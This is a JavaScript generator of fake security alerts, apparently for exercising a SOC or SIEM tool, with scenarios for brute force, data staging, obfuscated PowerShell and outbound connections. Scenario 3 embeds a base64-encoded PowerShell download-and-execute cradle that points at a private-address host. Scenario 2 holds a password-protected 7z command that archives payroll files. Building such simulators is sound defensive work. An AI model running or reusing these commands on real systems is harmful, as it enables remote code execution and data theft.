function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomChoice(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomIP() {
    return `${randomInt(1, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(1, 254)}`;
}

const users = ["CORP\\svc_backup_admin", "CORP\\jwillison", "CORP\\bkerry", "CORP\\admin", "SALES\\hannah02"];
const hosts = ["WORKSTATION-UNKNOWN", "HR-LAPTOP-055", "WORKSTATION-042", "DC-01", "WIN-7Q3P9M2Q"];
const domains = ["CORP", "SALES", "RETAIL"];

const scenarios = [
    // Scenario 1: Brute Force / Login Failure (MITRE T1110)
    () => {
        return {
            source: "winevent-log",
            severity: "warning",
            type: "login_failure",
            payload: {
                "event_id": 4625,
                "user": randomChoice(users),
                "domain": randomChoice(domains),
                "source_ip": "45.155.205." + randomInt(10, 200),
                "source_port": randomInt(49152, 65535),
                "logon_type": 3,
                "failure_code": "0xC000006A",
                "workstation": randomChoice(hosts),
                "user_agent": randomChoice(["Hydra/9.1", "python-requests/2.25.1", "Mozilla/5.0"])
            }
        };
    },
    // Scenario 2: Exfiltration via 7-Zip (MITRE T1048)
    () => {
        const user = "CORP\\jwillison";
        return {
            source: "edr",
            severity: "medium",
            type: "process_create",
            payload: {
                "event_type": "SuspiciousCompression",
                "event_id": 4688,
                "host": "HR-LAPTOP-055",
                "user": user,
                "image": "C:\\Program Files\\7-Zip\\7z.exe",
                "command_line": "7z.exe a -t7z -mx=9 -p C:\\Users\\Public\\backup_logs.7z C:\\Share\\Finance\\Payroll\\2025\\*",
                "parent_image": "C:\\Windows\\System32\\cmd.exe",
                "tactic": "Exfiltration",
                "technique": "T1560 - Archive Collected Data"
            }
        };
    },
    // Scenario 3: Lateral Movement / Obfuscated PowerShell (MITRE T1021)
    () => {
        return {
            source: "edr",
            severity: "critical",
            type: "process_create",
            payload: {
                "event_type": "ObfuscatedPowerShell",
                "event_id": 4688,
                "host": "WORKSTATION-042",
                "user": "CORP\\bkerry",
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEAMgAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==",
                "parent_image": "C:\\Windows\\System32\\explorer.exe",
                "tactic": "Defense Evasion",
                "technique": "T1027 - Obfuscated Files or Information"
            }
        };
    },
    // Scenario 4: Network Connection (C2/Exfil)
    () => {
        return {
            source: "network-firewall",
            severity: "high",
            type: "network_connection",
            payload: {
                "src_ip": "10.20.1." + randomInt(50, 99),
                "dest_ip": randomIP(),
                "dest_port": 443,
                "protocol": "TCP",
                "bytes_out": randomInt(10000, 50000000),
                "process_owner": randomChoice(users),
                "process_name": randomChoice(["curl.exe", "powershell.exe"]),
                "ja3_hash": "e7d705a3286e2d71c50680ea3ac22c1b"
            }
        }
    }
];

export function generateEvent() {
    const event = randomChoice(scenarios)();
    event.timestamp = new Date().toISOString();
    return event;
}
